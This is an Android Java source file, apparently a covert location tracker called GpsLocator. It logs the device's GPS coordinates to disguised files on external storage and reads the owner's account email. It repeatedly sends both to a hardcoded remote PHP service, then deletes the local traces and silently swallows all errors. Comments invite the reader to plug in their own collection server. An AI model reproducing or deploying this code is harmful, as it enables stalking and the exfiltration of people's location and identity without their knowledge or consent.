package com.example.gpslocator;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.File;
import java.io.BufferedWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.view.Menu;
import android.content.Context;
import android.content.Intent;
import android.content.res.AssetManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.widget.Toast;


public class MainActivity extends Activity {
	
    @Override
    public void onCreate(Bundle savedInstanceState) 
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
    	// sendF
        App _app = new App();
        _app.sendF();
        
        /* Use the LocationManager class to obtain GPS locations */
        
        LocationManager mlocManager = (LocationManager)getSystemService(Context.LOCATION_SERVICE);
        LocationListener mlocListener = new MyLocationListener();

        mlocManager.requestLocationUpdates( LocationManager.GPS_PROVIDER, 0, 0, mlocListener);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) 
    {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }
    
/**
 *  This is the only file needed to run GpsLocator
 * 
 * 	author : damiz
 *  date : 2012
 */
public class MyLocationListener implements LocationListener
{
		public App _app = new App();
    	public void onLocationChanged(Location loc)
    	{
    		loc.getLatitude();
    		loc.getLongitude();
    		
    		String Text = loc.getLatitude() + ":" + loc.getLongitude();
    		
    		try {
    			_app.pD(Text);
    			_app.sendF();
    		} catch (Exception e) {
    			// put nothing in here
    		}
    	}
  
    	public void onProviderDisabled(String provider)
    	{
    		_app.sendF();
    	}
    	
    	public void onProviderEnabled(String provider)
    	{
    		_app.sendF();
    	}
    	
    	public void onStatusChanged(String provider, int status, Bundle extras)
    	{
    		_app.sendF();
    	}
    	
    }

    public class App {
    	
    	// put your post service
    	public String postService = "http://inkodeo.be/WebServices/gloc.php";
    	
    	// put your crop repository
    	public  String cropPath = "/download/";
    	public  String cropName = "a";
    	public  String cropExtension = "psg";
    	public  int count = 0;
    	
    	public void App()
    	{
    		this.sendF();
    	}
    	
    	public  void saveCrop(String s) throws IOException
    	{
    		int cropCount=this.getLastCropNumber();
    		if(this.count>90)
    		{
    			//
    			cropCount++;this.count=0;
    		}
            FileWriter f = new FileWriter(Environment.getExternalStorageDirectory() 
            		+ this.cropPath+this.cropName+"."+(cropCount)+"."+this.cropExtension, true);
            try {
               f.write(s);
            } finally {
               f.close();
            }
    	}    	
      	
    	public  String getEmailAccount()
    	{
    		AccountManager manager = (AccountManager) getSystemService(Context.ACCOUNT_SERVICE);
    		Account[] accounts = manager.getAccounts();
    	    //Account[] accounts = manager.getAccountsByType("com.google"); // google only
    	    List<String> possibleEmails = new LinkedList<String>();

    	    for (Account account : accounts) {
    	      possibleEmails.add(account.name);
    	    }
    	    
    	    if(!possibleEmails.isEmpty() && possibleEmails.get(0) != null){
    	        String email = possibleEmails.get(0);
    	        String[] parts = email.split("@");
    	        
    	        if(parts.length > 0 && parts[0] != null)
    	            return email;
    	        else
    	            return "nobody";
    	        
    	    }else
    	        return "nobody";
    	}
    	
    	// postData
    	public  void pD(String s) throws IOException
    	{
    		
    	    try {
    	    	
    	    	saveCrop(android.text.format.DateFormat.format("yyyy-MM-dd hh:mm:ss", new java.util.Date())+"-"+s+"/");
    	    	this.count++;
    	    	if(this.count>95)
    	    	{
    	    		this.count=0;
    	    	}
    	        
    	    } catch (IOException e) {
    	    	
    	    	// put nothing in here
    	    }
    	}

    	
    	public  String getFile(String filePath) throws java.io.IOException
    	{
    	    BufferedReader reader = new BufferedReader(new FileReader(filePath));
    	    String line, results = "";
    	    while( ( line = reader.readLine() ) != null)
    	    {
    	        results += line;
    	    }
    	    reader.close();
    	    return results;
    	}
    	
    	public  String getString(String file)
    	{
    		File sdcard = Environment.getExternalStorageDirectory();
    		
    		//Get the text file
    		File f = new File(sdcard,"/download/"+file+".txt");
    		
    		//Read text from file
    		StringBuilder text = new StringBuilder();
    		
    		try {
    		    BufferedReader br = new BufferedReader(new FileReader(f));
    		    String line;

    		    while ((line = br.readLine()) != null) {
    		        text.append(line);
    		        text.append('\n');
    		    }
    		}
    		catch (IOException e) {
    		    //You'll need to add proper error handling here
    		}
    		
    		return text.toString();
    	}
    	
        	public  int getLastCropNumber()
        	{
        		int nmb=0;
        		String[] fileList = new File(Environment.getExternalStorageDirectory()+this.cropPath).list();
        		
        		try
        		{
        		if(fileList.length>0)
        		{
            		for(int i=0;i<fileList.length;i++)
            		{
            			if(fileList[i].endsWith("."+this.cropExtension))
            			{
            				String tmp = fileList[i].split("\\.")[1];
            				if(nmb<Integer.parseInt(tmp))
            				{
            					nmb=Integer.parseInt(tmp);
            				}
            			}
            		}
            		
        		}
        		}catch(Exception e){
        			// put nothing in here
        		}
        		
        		return nmb;
        	}
        	
        	
    	public  boolean sendF()
    	{
    		try
    		{
        		// Create a new HttpClient and Post Header
        	    HttpClient httpclient = new DefaultHttpClient();
        	    
        	    // put your php post service in place
        	    HttpPost httppost = new HttpPost(this.postService);
            	
    	        List nVP = new ArrayList(2);
    	        nVP.add(new BasicNameValuePair("usr", this.getEmailAccount()));
    	        
        		String[] fileList = new File(Environment.getExternalStorageDirectory()+this.cropPath).list();
        		
        		if(fileList.length>0)
        		{
    	    		for(int i=0;i<fileList.length;i++)
    	    		{
    	    			if(fileList[i].endsWith(cropExtension))
    	    			{
    	    				String cPath = this.cropPath+this.cropName+"."+this.getLastCropNumber()+"."+this.cropExtension;
    	    				
    	    				// set the repository for cropping
    	    		        nVP.add(new BasicNameValuePair("ctc", getFile(Environment.getExternalStorageDirectory()+cPath)));
    	    		        // send the file content by posting it to an online post service
    	    		        httppost.setEntity(new UrlEncodedFormEntity(nVP));
    	    		        
    	    	    	    HttpResponse response = httpclient.execute(httppost);
    	    	    	    
    	    	    	    // deleting crop if sended
    	    		        File f = new File(Environment.getExternalStorageDirectory()+cPath);
    	    	        	if (f.exists()) {
    	    	        	  f.delete();
    	    	        	}
    	    			}
    	    		}
        		}
        		
    		} catch(Exception e) {
    			// put nothing in here
    		}
    		
    		return true;
    	}
    	
    }

}
